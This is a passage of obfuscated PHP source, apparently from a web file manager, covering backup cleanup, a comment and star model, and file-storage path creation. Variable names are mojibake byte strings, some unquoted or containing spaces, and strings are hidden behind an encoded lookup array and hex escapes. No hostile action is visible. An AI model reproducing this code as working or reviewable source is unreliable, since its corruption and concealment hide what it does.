$_SERVER[®»±”ó²]; $•èœÍàÙ = $this->listData($ñş«Ñ¾•); if (!$•èœÍàÙ || empty($•èœÍàÙ[$ÎäãÕÉŸ[32]])) { return !0; } Task::kill($ÎäãÕÉŸ[866]); Task::kill($ÎäãÕÉŸ[885]); Task::kill($ÎäãÕÉŸ[895]); $£ÚóÆµ„ = $•èœÍàÙ[$ÎäãÕÉŸ[32]]; $ŞÍáç Ã = TEMP_FILES . $ÎäãÕÉŸ[861] . $£ÚóÆµ„ . $ÎäãÕÉŸ[8]; IO::remove($ŞÍáç Ã, !1); return $this->remove($ñş«Ñ¾•); } public function remove($…‰ã¼ÙÏ) { $ÈÄ‡Ô = $this->listData($…‰ã¼ÙÏ); if (!$ÈÄ‡Ô) { return !0; } return $this->backupRemove($ÈÄ‡Ô); } private function backupRemove($ğ³ÊİØş) { parent::remove($ğ³ÊİØş[$_SERVER[®»±”ó²][477]]); $»»¬¶üÏ = $this->backupPath($ğ³ÊİØş); IO::remove($»»¬¶üÏ, !1); return !0; } private function backupPath($İœì÷©¹) { $ÅèÆ¡ª =& $_SERVER[®»±”ó²]; $£Ò«——Ö = $İœì÷©¹[$ÅèÆ¡ª[32]]; $ÚŸœÑÌÕ = Model($ÅèÆ¡ª[851])->get($ÅèÆ¡ª[852]); $‚£°ç½ğ = substr(md5($ÅèÆ¡ª[853] . $ÚŸœÑÌÕ . $£Ò«——Ö), 0, 8); return "\x7b\151\x6f\x3a{$İœì÷©¹[$ÅèÆ¡ª[832]]}\x7d\x2f\x64\x61\x74\141\x62\141\163\145\57\142\x61\143\x6b\x75\160\x2f" . $£Ò«——Ö . $ÅèÆ¡ª[11] . $‚£°ç½ğ; } public function start() { $êÈÎ”†¡ =& $_SERVER[®»±”ó²]; if ($GLOBALS[$êÈÎ”†¡[6]][$êÈÎ”†¡[92]][$êÈÎ”†¡[2019]] != $êÈÎ”†¡[91]) { return !0; } $Ç­ü‡Ô† = $this->config(); if (!$Ç­ü‡Ô† || $Ç­ü‡Ô†[$êÈÎ”†¡[1760]] != $êÈÎ”†¡[91]) { return !1; } if ($Ç­ü‡Ô†[$êÈÎ”†¡[171]] == $êÈÎ”†¡[857]) { $²ºşå˜ë = Model($êÈÎ”†¡[851])->get($êÈÎ”†¡[1336]); if ($²ºşå˜ë == $êÈÎ”†¡[1337]) { $Ç­ü‡Ô†[$êÈÎ”†¡[171]] = $êÈÎ”†¡[1219]; } } $“ŠäıŠÚ = $this->process(); foreach ($“ŠäıŠÚ as $Ğ£ø…ÕÆ) { if ($Ğ£ø…ÕÆ) { return Task::restart($Ğ£ø…ÕÆ[$êÈÎ”†¡[477]]); } } $ÖÆÙÓØã = new Backup(); $ö–ƒ¢à½ = $ÖÆÙÓØã->db(); if ($ö–ƒ¢à½) { $ö–ƒ¢à½ = $ÖÆÙÓØã->dbFile(); if ($ö–ƒ¢à½ && $Ç­ü‡Ô†[$êÈÎ”†¡[171]] == $êÈÎ”†¡[857]) { $ö–ƒ¢à½ = $ÖÆÙÓØã->file(); } } Backup::set(array($êÈÎ”†¡[830] => 1, $êÈÎ”†¡[842] => time())); return !0; } public function process() { $‹ª¿Ç‰ =& $_SERVER[®»±”ó²]; $»ÚÔüß = array($‹ª¿Ç‰[838] => Task::get($‹ª¿Ç‰[866]), $‹ª¿Ç‰[843] => Task::get($‹ª¿Ç‰[885]), $‹ª¿Ç‰[233] => Task::get($‹ª¿Ç‰[895])); $éØÖÁúÆ = !1; foreach ($»ÚÔüß as &$‡©ŒÒ) { if ($éØÖÁúÆ) { $‡©ŒÒ = !1; continue; } if ($‡©ŒÒ) { $…ÖÄ÷¡ç = intval(_get($‡©ŒÒ, $‹ª¿Ç‰[1796], 0)); if (time() - $…ÖÄ÷¡ç > 7200) { Task::kill($‡©ŒÒ[$‹ª¿Ç‰[477]]); $éØÖÁúÆ = !0; $‡©ŒÒ = !1; } } } return $»ÚÔüß; } public function restore() { $Ë”ò‘Â =& $_SERVER[®»±”ó²]; ActionCall($Ë”ò‘Â[1147], !0, 1); ActionCall($Ë”ò‘Â[1147], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\x6d\x6d\145\156\x74"; protected $tableMeta = array("\164\x61\x62\x6c\145\116\141\x6d\145" => "\143\x6f\155\x6d\x65\156\164\137\x6d\145\164\x61", "\155\x65\x74\x61\106\151\x65\154\144" => "\x63\157\x6d\x6d\x65\x6e\x74\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($Æ­å°¾ş) { $’âÀ÷Æ =& $_SERVER[®»±”ó²]; if ($Æ­å°¾ş[$’âÀ÷Æ[2020]]) { $¬Éİ¨­Õ = $this->where(array($’âÀ÷Æ[2021] => $Æ­å°¾ş[$’âÀ÷Æ[2020]]))->find(); if (!$¬Éİ¨­Õ || $¬Éİ¨­Õ[$’âÀ÷Æ[191]] != $Æ­å°¾ş[$’âÀ÷Æ[191]] || $¬Éİ¨­Õ[$’âÀ÷Æ[582]] != $Æ­å°¾ş[$’âÀ÷Æ[582]]) { return !1; } $this->where(array($’âÀ÷Æ[2021] => $Æ­å°¾ş[$’âÀ÷Æ[2020]]))->setAdd($’âÀ÷Æ[2022], 1); } $Æ­å°¾ş[$’âÀ÷Æ[2023]] = 0; $Æ­å°¾ş[$’âÀ÷Æ[2022]] = 0; $Æ­å°¾ş[$’âÀ÷Æ[830]] = 1; return $this->add($Æ­å°¾ş); } public function commentCount($ÛéÉ¹óÓ, $ö£Û©ë¡, $âç¨­’ = false) { $¾Ğ˜åã× =& $_SERVER[®»±”ó²]; if (!$ÛéÉ¹óÓ) { return array(); } if (is_string($ÛéÉ¹óÓ) || is_int($ÛéÉ¹óÓ)) { $ÛéÉ¹óÓ = array($ÛéÉ¹óÓ); } $š¹§´‚ = array($¾Ğ˜åã×[582], $¾Ğ˜åã×[2024] => $¾Ğ˜åã×[578]); $åÛŞ©®ß = array($¾Ğ˜åã×[582] => array($¾Ğ˜åã×[7], $ÛéÉ¹óÓ), $¾Ğ˜åã×[191] => $ö£Û©ë¡); if ($âç¨­’) { $åÛŞ©®ß[$¾Ğ˜åã×[1791]] = $âç¨­’; } $±¦ñ ¢ = $this->field($š¹§´‚)->where($åÛŞ©®ß)->group($¾Ğ˜åã×[582])->select(); return array_to_keyvalue($±¦ñ ¢, $¾Ğ˜åã×[582], $¾Ğ˜åã×[578]); } public function starTarget($„˜ĞäÙ, $ûöÇİÕë) { $ËÏ’ø =& $_SERVER[®»±”ó²]; $†î±ÓÄ– = $„˜ĞäÙ + self::TYPE_STAR_OFFSET; $çú»±ö¼ = array($ËÏ’ø[1791] => USER_ID, $ËÏ’ø[191] => $†î±ÓÄ–, $ËÏ’ø[582] => $ûöÇİÕë); $ëÆ¯´å… = $this->where($çú»±ö¼)->find(); if ($ëÆ¯´å…) { return $this->where(array($ËÏ’ø[477] => $ëÆ¯´å…[$ËÏ’ø[477]]))->delete(); } $ÉÑ—’ùÈ = array($ËÏ’ø[2020] => 0, $ËÏ’ø[1791] => USER_ID, $ËÏ’ø[830] => 1, $ËÏ’ø[171] => $ËÏ’ø[12], $ËÏ’ø[191] => $†î±ÓÄ–, $ËÏ’ø[582] => $ûöÇİÕë, $ËÏ’ø[2023] => 0, $ËÏ’ø[2022] => 0); return $this->add($ÉÑ—’ùÈ); } public function starTargetCount($¬¼É›Š¸, $„Ø®Û) { $å–¯“æ™ =& $_SERVER[®»±”ó²]; $€¡ÊÄğ = $„Ø®Û + self::TYPE_STAR_OFFSET; $ƒ¼Ò¢óİ = $this->commentCount($¬¼É›Š¸, $€¡ÊÄğ); $§¯İÌ– = $this->commentCount($¬¼É›Š¸, $€¡ÊÄğ, USER_ID); return array($å–¯“æ™[2025] => $ƒ¼Ò¢óİ, $å–¯“æ™[2026] => $§¯İÌ–); } public function starTargetUserList($÷•ú–êİ, $Î¯“ÅÄó) { $ç…İ¥¡ =& $_SERVER[®»±”ó²]; $È¶ŒË“„ = $÷•ú–êİ + self::TYPE_STAR_OFFSET; $ô½¼…éé = array($ç…İ¥¡[582] => $Î¯“ÅÄó, $ç…İ¥¡[191] => $È¶ŒË“„); $³øæèäµ = $this->where($ô½¼…éé)->count(); $ÆøÎô³³ = array($ç…İ¥¡[335] => $³øæèäµ, $ç…İ¥¡[2027] => array()); if (!$³øæèäµ) { return $ÆøÎô³³; } $¸›•„ªû = $this->field($ç…İ¥¡[1791])->where($ô½¼…éé)->limit(500)->select(); $¸›•„ªû = array_to_keyvalue($¸›•„ªû, $ç…İ¥¡[12], $ç…İ¥¡[1791]); $ÆøÎô³³[$ç…İ¥¡[2027]] = Model($ç…İ¥¡[590])->userListInfo($¸›•„ªû); return $ÆøÎô³³; } public function prasiseUserList($°­Ä‚›¡) { $É“å¾ˆÜ =& $_SERVER[®»±”ó²]; $şÈÀÈ€• = array($É“å¾ˆÜ[2028] => $°­Ä‚›¡); $¿êíß“ = $this->where($şÈÀÈ€•)->find(); $å¿å’Êß = _get($¿êíß“, $É“å¾ˆÜ[2023], 0); $ƒ§î¤‹û = array($É“å¾ˆÜ[335] => $å¿å’Êß, $É“å¾ˆÜ[2027] => array()); if (!$å¿å’Êß) { return $ƒ§î¤‹û; } $ØøË˜Ö = Model($É“å¾ˆÜ[2029])->field($É“å¾ˆÜ[1791])->where($şÈÀÈ€•)->limit(500)->select(); $ØøË˜Ö = array_to_keyvalue($ØøË˜Ö, $É“å¾ˆÜ[12], $É“å¾ˆÜ[1791]); $ƒ§î¤‹û[$É“å¾ˆÜ[2027]] = Model($É“å¾ˆÜ[590])->userListInfo($ØøË˜Ö); return $ƒ§î¤‹û; } public function remove($Ñ¹îÍšÃ) { $Šæç‹¹» =& $_SERVER[®»±”ó²]; $âŞ¯œ€Ñ = array($Šæç‹¹»[2021] => $Ñ¹îÍšÃ); $Ğ«ŞÀ¦ = $this->where($âŞ¯œ€Ñ)->find(); if ($Ğ«ŞÀ¦[$Šæç‹¹»[2020]]) { $this->where(array($Šæç‹¹»[2021] => $Ğ«ŞÀ¦[$Šæç‹¹»[2020]]))->setAdd($Šæç‹¹»[2022], -1); } return $this->where($âŞ¯œ€Ñ)->delete(); } public function edit($ÜŒ”ˆÆ, $ÓÄİè˜) { $¡ğí™ÉÓ =& $_SERVER[®»±”ó²]; $Ê¥ÉéÓÍ = array($¡ğí™ÉÓ[2021] => $ÜŒ”ˆÆ); return $this->where($Ê¥ÉéÓÍ)->save(array($¡ğí™ÉÓ[2030] => $ÓÄİè˜)); } public function prasise($ÁàÏİ½ß) { $öí›‘È =& $_SERVER[®»±”ó²]; $š¢‚«®Ò = Model($öí›‘È[2031]); $¡µş¯Ó• = array($öí›‘È[2021] => $ÁàÏİ½ß, $öí›‘È[1782] => USER_ID); $µì±ÖåØ = $š¢‚«®Ò->where($¡µş¯Ó•)->find(); if (!$µì±ÖåØ) { $š¢‚«®Ò->add($¡µş¯Ó•); $Ğ†ú‡ = $this->where(array($öí›‘È[2021] => $ÁàÏİ½ß))->setAdd($öí›‘È[2023], 1); } else { $š¢‚«®Ò->where($¡µş¯Ó•)->delete(); $Ğ†ú‡ = $this->where(array($öí›‘È[2021] => $ÁàÏİ½ß))->setAdd($öí›‘È[2023], -1); } return $Ğ†ú‡; } public function targetInfo($­¥ïñæÇ, $—´‚¿çí) { $‡¿ÙáÌÓ =& $_SERVER[®»±”ó²]; $æÔÅ«ì = array($‡¿ÙáÌÓ[664] => $­¥ïñæÇ, $‡¿ÙáÌÓ[665] => $—´‚¿çí); $ìÙ¦òµÌ = $this->where($æÔÅ«ì)->count(); $‹”ë²‡ = "\x52\111\x47\110\124\40\x4a\x4f\111\116\40{$this->tablePrefix}\143\157\155\x6d\x65\156\164\x5f\160\x72\x61\x69\163\145\40\163\164\x61\162\x20\157\x6e\40\143\x6f\x6d\x6d\145\x6e\164\x2e\x63\x6f\155\155\x65\156\x74\111\x44\x20\x3d\x20\163\x74\x61\x72\56\143\x6f\155\x6d\x65\x6e\164\111\x44"; $ÀÅè³úÅ = $this->alias($‡¿ÙáÌÓ[431])->where($æÔÅ«ì)->join($‹”ë²‡, $‡¿ÙáÌÓ[2032])->count(); $À„ü¼”Ï = array($‡¿ÙáÌÓ[2033] => $ìÙ¦òµÌ, $‡¿ÙáÌÓ[2034] => $ÀÅè³úÅ); return $À„ü¼”Ï; } public function listData($Œİ«ˆî) { $çê¶ü“® =& $_SERVER[®»±”ó²]; if (isset($Œİ«ˆî[$çê¶ü“®[2035]])) { if ($Œİ«ˆî[$çê¶ü“®[2035]]) { $Œİ«ˆî[$çê¶ü“®[2028]] = array($çê¶ü“®[1101], intval($Œİ«ˆî[$çê¶ü“®[2035]])); } unset($Œİ«ˆî[$çê¶ü“®[2035]]); } if (isset($Œİ«ˆî[$çê¶ü“®[2036]])) { if ($Œİ«ˆî[$çê¶ü“®[2036]]) { $Œİ«ˆî[$çê¶ü“®[2028]] = array($çê¶ü“®[1098], intval($Œİ«ˆî[$çê¶ü“®[2036]])); } unset($Œİ«ˆî[$çê¶ü“®[2036]]); } return $this->_listData($Œİ«ˆî); } private function _listData($Ä•ÎáÙ’) { $ğì¶ĞıÂ =& $_SERVER[®»±”ó²]; $¯‹Œ” = $this->where($Ä•ÎáÙ’)->_makeOrder()->selectPage(100); $this->_listAppendParent($¯‹Œ”[$ğì¶ĞıÂ[447]]); $this->_listAppendUser($¯‹Œ”[$ğì¶ĞıÂ[447]]); $this->_listAppendMeta($¯‹Œ”[$ğì¶ĞıÂ[447]]); return $¯‹Œ”; } private function _makeOrder() { $Æû²ãìã =& $_SERVER[®»±”ó²]; $ğêø£Û¾ = array($Æû²ãìã[2023], $Æû²ãìã[2022], $Æû²ãìã[234]); $é›øÆÇû = Input::get($Æû²ãìã[541], $Æû²ãìã[7], $Æû²ãìã[508], $ğêø£Û¾); $×—á´é = Input::get($Æû²ãìã[542], $Æû²ãìã[7], $Æû²ãìã[1784], array($Æû²ãìã[2037], $Æû²ãìã[537])); $§š¤Õ”¬ = $é›øÆÇû . $Æû²ãìã[53] . $×—á´é; return $this->order($§š¤Õ”¬); } private function _listAppendParent(&$Ñéˆ˜†æ) { $èÊ¾¡Ã =& $_SERVER[®»±”ó²]; $½óÏ¿úò = array_unique(array_to_keyvalue($Ñéˆ˜†æ, $èÊ¾¡Ã[12], $èÊ¾¡Ã[2020])); $½óÏ¿úò = array_remove_value($½óÏ¿úò, $èÊ¾¡Ã[231]); if (!$½óÏ¿úò) { return; } $úï²¨éÄ = $this->where(array($èÊ¾¡Ã[2021] => array($èÊ¾¡Ã[7], $½óÏ¿úò)))->select(); $úï²¨éÄ = array_to_keyvalue($úï²¨éÄ, $èÊ¾¡Ã[2028]); foreach ($Ñéˆ˜†æ as &$É×öíÂÔ) { if (isset($úï²¨éÄ[$É×öíÂÔ[$èÊ¾¡Ã[2020]]])) { $É×öíÂÔ[$èÊ¾¡Ã[2038]] = $úï²¨éÄ[$É×öíÂÔ[$èÊ¾¡Ã[2020]]]; } } unset($É×öíÂÔ); } private function _listAppendUser(&$í½¤˜Ë) { $Êó»¦ÒÕ =& $_SERVER[®»±”ó²]; $Æöıù¹ä = array_unique(array_to_keyvalue($í½¤˜Ë, $Êó»¦ÒÕ[12], $Êó»¦ÒÕ[1791])); $Æöıù¹ä = array_remove_value($Æöıù¹ä, $Êó»¦ÒÕ[231]); if (count($Æöıù¹ä) == 0) { return; } foreach ($í½¤˜Ë as $˜Ÿ™Ä¯Ÿ) { if (isset($˜Ÿ™Ä¯Ÿ[$Êó»¦ÒÕ[2038]])) { $Æöıù¹ä[] = $˜Ÿ™Ä¯Ÿ[$Êó»¦ÒÕ[2038]][$Êó»¦ÒÕ[1791]]; } } $Ş¯¿åÙ± = Model($Êó»¦ÒÕ[610])->userListInfo($Æöıù¹ä); foreach ($í½¤˜Ë as &$˜Ÿ™Ä¯Ÿ) { $˜Ÿ™Ä¯Ÿ[$Êó»¦ÒÕ[678]] = $Ş¯¿åÙ±[$˜Ÿ™Ä¯Ÿ[$Êó»¦ÒÕ[1791]]]; if (isset($˜Ÿ™Ä¯Ÿ[$Êó»¦ÒÕ[2038]])) { $˜Ÿ™Ä¯Ÿ[$Êó»¦ÒÕ[2038]][$Êó»¦ÒÕ[678]] = $Ş¯¿åÙ±[$˜Ÿ™Ä¯Ÿ[$Êó»¦ÒÕ[2038]][$Êó»¦ÒÕ[1791]]]; } } unset($˜Ÿ™Ä¯Ÿ); } private function _listAppendMeta(&$Ç”¢©×) { $ë·µÙÔ» =& $_SERVER[®»±”ó²]; $Ì¡†œØ = array_unique(array_to_keyvalue($Ç”¢©×, $ë·µÙÔ»[12], $ë·µÙÔ»[2028])); $Ì¡†œØ = array_remove_value($Ì¡†œØ, $ë·µÙÔ»[231]); if (!$Ì¡†œØ) { return; } foreach ($Ç”¢©× as $ÔšŞÀÔ) { if (isset($ÔšŞÀÔ[$ë·µÙÔ»[2038]])) { $Ì¡†œØ[] = $ÔšŞÀÔ[$ë·µÙÔ»[2038]][$ë·µÙÔ»[2028]]; } } $œûíÉ€İ = $this->metaList($Ì¡†œØ); if (!$œûíÉ€İ) { return !1; } foreach ($Ç”¢©× as &$ÔšŞÀÔ) { $ÔšŞÀÔ[$ë·µÙÔ»[552]] = $œûíÉ€İ[$ÔšŞÀÔ[$ë·µÙÔ»[2028]]]; if (isset($ÔšŞÀÔ[$ë·µÙÔ»[2038]])) { $ÔšŞÀÔ[$ë·µÙÔ»[2038]][$ë·µÙÔ»[552]] = $œûíÉ€İ[$ÔšŞÀÔ[$ë·µÙÔ»[2038]][$ë·µÙÔ»[2028]]]; } } unset($ÔšŞÀÔ); } private function metaList($¶óìÒÂ) { $“Œ¸íì² =& $_SERVER[®»±”ó²]; if (!$¶óìÒÂ) { return array(); } $õÅˆÆ…° = array($“Œ¸íì²[2028] => array($“Œ¸íì²[7], $¶óìÒÂ)); $÷ÉÊ³Ùö = Model($“Œ¸íì²[2039])->where($õÅˆÆ…°)->select(); $÷ÉÊ³Ùö = array_to_keyvalue_group($÷ÉÊ³Ùö, $“Œ¸íì²[2028]); foreach ($÷ÉÊ³Ùö as $ê€Œı´ü => $¿Ï¸¾Œ) { $Ãüéòøè = array(); foreach ($¿Ï¸¾Œ as $§Êù®­) { $Ãüéòøè[$§Êù®­[$“Œ¸íì²[97]]] = $§Êù®­[$“Œ¸íì²[452]]; } $÷ÉÊ³Ùö[$ê€Œı´ü] = $Ãüéòøè; } return $÷ÉÊ³Ùö ? $÷ÉÊ³Ùö : array(); } public function removeTarget($—Ã½àª¡, $²ß–ó) { $ÚšÍìòì =& $_SERVER[®»±”ó²]; if (!$²ß–ó) { return !0; } $²ß–ó = is_array($²ß–ó) ? $²ß–ó : array($²ß–ó); $ø´œ˜ = array($ÚšÍìòì[191] => $—Ã½àª¡, $ÚšÍìòì[582] => array($ÚšÍìòì[7], $²ß–ó)); $¯ñ³‰şé = $this->field($ÚšÍìòì[2028])->where($ø´œ˜)->select(); $×ê·ÅÚ = array_to_keyvalue($¯ñ³‰şé, $ÚšÍìòì[12], $ÚšÍìòì[2028]); if (!$×ê·ÅÚ) { return !0; } $ø´œ˜ = array($ÚšÍìòì[2028] => array($ÚšÍìòì[7], $×ê·ÅÚ)); $this->where($ø´œ˜)->delete(); Model($ÚšÍìòì[2031])->where($ø´œ˜)->delete(); Model($ÚšÍìòì[2040])->where($ø´œ˜)->delete(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\x6f\137\x66\151\x6c\x65\x5f\x63\x6f\156\x74\x65\156\x74\x73"; protected $dataAuto = array(array("\x63\162\145\141\164\145\124\x69\x6d\x65", "\x74\151\155\145", "\x69\156\163\145\162\x74", "\x66\165\x6e\143\x74\151\x6f\x6e")); } goto AÙËÌ‰Å‡; AÙËÌ‰Å‡: class FileModel extends ModelBase { protected $tableName = "\x69\x6f\137\x66\151\154\145"; protected $tableMeta = array("\164\x61\x62\154\x65\116\x61\155\x65" => "\151\x6f\x5f\146\x69\154\145\x5f\155\145\164\x61", "\155\145\164\141\x46\x69\x65\154\144" => "\x66\151\154\145\111\104"); public function fileInfo($’°ÇÀ–Æ) { $¤±óÁœ =& $_SERVER[®»±”ó²]; static $Ïé”Ï¿Ó = array(); if (!isset($Ïé”Ï¿Ó[$’°ÇÀ–Æ])) { $Éš»òÜ = $¤±óÁœ[2041]; $ËŒÚŠ = Model($¤±óÁœ[557])->field($Éš»òÜ)->where(array($¤±óÁœ[555] => $’°ÇÀ–Æ))->find(); $Ïé”Ï¿Ó[$’°ÇÀ–Æ] = $ËŒÚŠ; } return $Ïé”Ï¿Ó[$’°ÇÀ–Æ]; } public function addFileByContent($ÔÛ´©ºã = '', $‚›ıÅ, $§¦²…Åû = '') { $Î™è‹Šƒ =& $_SERVER[®»±”ó²]; $ŸÂé½ÄÙ = TEMP_PATH . $Î™è‹Šƒ[2042]; if (!is_dir($ŸÂé½ÄÙ)) { mk_dir($ŸÂé½ÄÙ); } $ëÅÄ»ò = $ŸÂé½ÄÙ . $Î™è‹Šƒ[2043] . rand_string(16); $â·¢ƒí¥ = file_put_contents($ëÅÄ»ò, $ÔÛ´©ºã); if ($â·¢ƒí¥ === !1 || strlen($ÔÛ´©ºã) != $â·¢ƒí¥) { return !1; } $İÏÌÎ¯ = $this->addFile($ëÅÄ»ò, $‚›ıÅ, $§¦²…Åû, !0); if (file_exists($ëÅÄ»ò)) { @unlink($ëÅÄ»ò); } return $İÏÌÎ¯; } public function createFileName($ÄêĞÖ©¤, $ôÊÑÍó, $éÌ‚µ… = false, $×¿»Œ¶¤ = false) { $êÈØ³…¶ =& $_SERVER[®»±”ó²]; $Ÿ‚¨ÉŠê = IO::init($êÈØ³…¶[8]); $šÓ¤Ô²¿ = $this->_makeFilePath($ÄêĞÖ©¤, $ôÊÑÍó, $Ÿ‚¨ÉŠê, $éÌ‚µ…, $×¿»Œ¶¤); $úö—ä÷ò = $Ÿ‚¨ÉŠê->pathFather($šÓ¤Ô²¿); static $ø£ØşÜ˜ = false; $íĞè‡«à = $êÈØ³…¶[2044] . md5($úö—ä÷ò); if (!$ø£ØşÜ˜ && !Cache::get($íĞè‡«à)) { $ø£ØşÜ˜ = !0; $Œ¡ŸÑ¤ = IO::mkdir($úö—ä÷ò); if (!IO::exist($Œ¡ŸÑ¤ . $êÈØ³…¶[880])) { IO::mkfile($Œ¡ŸÑ¤ . $êÈØ³…¶[880]); } Cache::set($íĞè‡«à, 1, 3600 * 2); } return $šÓ¤Ô²¿; } public function _makeFilePath($òÑ¯¿Ô», $íîÂ¤Ú, $Ø¹šçşõ, $—şç©İç = false, $é€´ÄŸ = false) { $»‘™©·é =& $_SERVER[®»±”ó²]; $›áöåáı = Model($»‘™©·é[851])->get($»‘™©·é[2045]); $œØÖ¼ƒÛ = $»‘™©·é[1334] . $íîÂ¤Ú[$»‘™©·é[477]] . $»‘™©·é[495] . date($»‘™©·é[2046]); $ğùÚÓ•‹ = $œØÖ¼ƒÛ . rand_string(5) . short_id(100); $òÑ¯¿Ô» = str_replace($»‘™©·é[8], $»‘™©·é[11], KodIO::clear($òÑ¯¿Ô»)); $»¬ØôĞ× = $Ø¹šçşõ->ext($òÑ¯¿Ô»); if (!$òÑ¯¿Ô») { $›áöåáı = $»‘™©·é[857]; } switch ($›áöåáı) { case $»‘™©·é[2047]: if ($»¬ØôĞ×) { $ğùÚÓ•‹ = $ğùÚÓ•‹ . $»‘™©·é[10] . $»¬ØôĞ×; } if ($»¬ØôĞ× == $»‘™©·é[1984]) { $ğùÚÓ•‹ .= $»‘™©·é[1303]; } break; case $»‘™©·é[2048]: $Â¡¥´à  = Model($»‘™©·é[851])->get($»‘™©·é[852]); $¨‰İ“¶Á = substr(md5($»‘™©·é[853] . $Â¡¥´à  . date($»‘™©·é[829])), 0, 8); $œØÖ¼ƒÛ = $»‘™©·é[1334] . $íîÂ¤Ú[$»‘™©·é[477]] . $»‘™©·é[495] . date($»‘™©·é[2049]) . $¨‰İ“¶Á . $»‘™©·é[8]; if ($»¬ØôĞ× == $»‘™©·é[1984]) { $òÑ¯¿Ô» .= $»‘™©·é[1303]; } $ƒóëÈ»á = $»‘™©·é[2050] . $œØÖ¼ƒÛ . $òÑ¯¿Ô»; CacheLock::lock($ƒóëÈ»á); $ğùÚÓ•‹ = $œØÖ¼ƒÛ . $òÑ¯¿Ô»; if (IO::exist($œØÖ¼ƒÛ . $òÑ¯¿Ô»)) { $×™Øœ‘ï = substr($òÑ¯¿Ô», 0, strlen($òÑ¯¿Ô») - strlen($»¬ØôĞ×)); $¦ÔÙ€— = $é€´ÄŸ ? substr($é€´ÄŸ, 0, 5) : ($—şç©İç ? substr($—şç©İç, 0, 5) : rand_string(5)); $ğùÚÓ•‹ = $œØÖ¼ƒÛ . $×™Øœ‘ï . $¦ÔÙ€—; if ($»¬ØôĞ×) { $ğùÚÓ•‹ = $ğùÚÓ•‹ . $»‘™©·é[10] . $»¬ØôĞ×; } } if (IO::isOsDriver($ğùÚÓ•‹) && !IO::isUploadServer($ğùÚÓ•‹)) { if (IO::exist($ğùÚÓ•‹)) { CacheLock::unlock($ƒóëÈ»á); return $ğùÚÓ•‹; } $¬­®ÖË… = IO::setContent($ğùÚÓ•‹, $»‘™©·é[12]); if (!$¬­®ÖË…) { show_json($»‘™©·é[2051], !1); } } CacheLock::unlock($ƒóëÈ»á); break; case $»‘™©·é[857]: break; default: break; } return $ğùÚÓ•‹; } public function addFileByRemote($¥Ğæô£•, $×¾–¿ö, $çì¬³õ‘ = array()) { $º¤Îİ¶Ú =& $_SERVER[®»±”ó²]; if (!IO::exist($¥Ğæô£•)) { return !1; } $‡Ğî¦¸ú = $çì¬³õ‘[$º¤Îİ¶Ú[560]] ? $çì¬³õ‘[$º¤Îİ¶Ú[560]] : $º¤Îİ¶Ú[12]; $Çó¹´ì = IO::hashMd5($¥Ğæô£•, $‡Ğî¦¸ú); $ƒÇ¦¡ã˜ = KodIO::parse($¥Ğæô£•); $ÊÉÀöı¬ = array($º¤Îİ¶Ú[633] => IO::size($¥Ğæô£•), $º¤Îİ¶Ú[2052] => 1, $º¤Îİ¶Ú[505] => $×¾–¿ö, $º¤Îİ¶Ú[894] => $ƒÇ¦¡ã˜[$º¤Îİ¶Ú[477]], $º¤Îİ¶Ú[506] => $¥Ğæô£•, $º¤Îİ¶Ú[2053] => $çì¬³õ‘[$º¤Îİ¶Ú[688]] ? $çì¬³õ‘[$º¤Îİ¶Ú[688]] : IO::hashSimple($¥Ğæô£•), $º¤Îİ¶Ú[2054] => $Çó¹´ì ? $Çó¹´ì : $‡Ğî¦¸ú); if ($ş•šÅ’ô = $this->addFileCheckExist($ÊÉÀöı¬[$º¤Îİ¶Ú[688]], $ÊÉÀöı¬[$º¤Îİ¶Ú[560]], $ÊÉÀöı¬[$º¤Îİ¶Ú[79]])) { return $ş•šÅ’ô; } return $this->addFileData($ÊÉÀöı¬); } private function addFileData($´”øŒ‚Æ) { $º¥½í÷¸ =& $_SERVER[®»±”ó²]; if (!$´”øŒ‚Æ) { return !1; } $´”øŒ‚Æ[$º¥½í÷¸[79]] = intval($´”øŒ‚Æ[$º¥½í÷¸[79]]); if (!$´”øŒ‚Æ[$º¥½í÷¸[79]] && strlen($´”øŒ‚Æ[$º¥½í÷¸[688]]) > 32) { $´”øŒ‚Æ[$º¥½í÷¸[79]] = intval(substr($´”øŒ‚Æ[$º¥½í÷¸[688]], 32)); } $Ôø–ä· = $this->add($´”øŒ‚Æ); return $this->find($Ôø–ä·); } public function addFile($íºîÎ÷ë, $›ı°ş‚È, $ ¢­°­, $™Ã³Âü¾ = false) { $—¥²çæ³ =& $_SERVER[®»±”ó²]; $ô±Öè¶Á = IO::hashSimple($íºîÎ÷ë); $Êåş‰Âı = IO::size($íºîÎ÷ë); $ûªŠ = $Êåş‰Âı <= 1024 * 1024 * 10 ? IO::hashMd5($íºîÎ÷ë) : $—¥²çæ³[12]; $Ş•‘š = $—¥²çæ³[2055] . $ô±Öè¶Á; CacheLock::lock($Ş•‘š); if ($ûªŠ && $ô±Öè¶Á) { $Ëèíş¯Á = $this->addFileCheckExist($ô±Öè¶Á, $ûªŠ, $Êåş‰Âı); if ($Ëèíş¯Á) { CacheLock::unlock($Ş•‘š); return $Ëèíş¯Á; } } $ÔôÈÙäú = $this->addFileMake($íºîÎ÷ë, $›ı°ş‚È, $Êåş‰Âı, $ô±Öè¶Á, $ûªŠ, $ ¢­°­, $™Ã³Âü¾); $ÀŸ³’áœ = $this->addFileData($ÔôÈÙäú); if (!$ÀŸ³’áœ) { return !1; } CacheLock::unlock($Ş•‘š); if (!$ûªŠ && $ÀŸ³’áœ) { $this->fileMd5Check($ÀŸ³’áœ); } return $ÀŸ³’áœ; } public function fileMd5Check($¯ÖÌåºª) { $Ê§„Ì® =& $_SERVER[®»±”ó²]; $éşÔÀ¶ = array($¯ÖÌåºª[$Ê§„Ì®[554]], $¯ÖÌåºª[$Ê§„Ì®[87]]); $€áÙÈÁ´ = $Ê§„Ì®[2056] . $¯ÖÌåºª[$Ê§„Ì®[87]]; $‹ÅüÉºö = $Ê§„Ì®[2057] . $¯ÖÌåºª[$Ê§„Ì®[554]]; TaskQueue::add($Ê§„Ì®[2058], $éşÔÀ¶, $€áÙÈÁ´, $‹ÅüÉºö); } public function fileMd5Set($±™ê½ğ², $ò®¡´¹ú) { $ÏöÅéıÒ =& $_SERVER[®»±”ó²]; $Á¬•™€­ = 